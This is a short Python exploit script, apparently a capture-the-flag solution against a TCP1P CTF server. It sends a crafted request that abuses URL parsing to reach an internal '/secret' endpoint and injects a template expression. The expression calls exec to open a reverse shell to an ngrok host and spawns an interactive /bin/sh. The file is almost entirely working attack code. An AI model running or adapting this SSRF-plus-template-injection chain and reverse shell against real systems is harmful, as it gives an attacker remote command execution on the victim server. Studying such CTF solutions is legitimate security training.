import requests


def encode_all(string):
	return "".join("%{0:0>2x}".format(ord(char)) for char in string)


URL = "http://ctf.tcp1p.team:10012/"
# URL = "http://127.0.0.1:23678"

payload = """self.__init__.__globals__.__builtins__['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.us-cal-1.ngrok.io",15659));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')"""
print(
	requests.get(
		URL,
		params={
			"url": f"@LOCALHOST:1337/secret?admin={encode_all("{{" + payload + "}}")}&a=/about/"
		},
		headers={"Accept-Encoding": None},
	).text
)
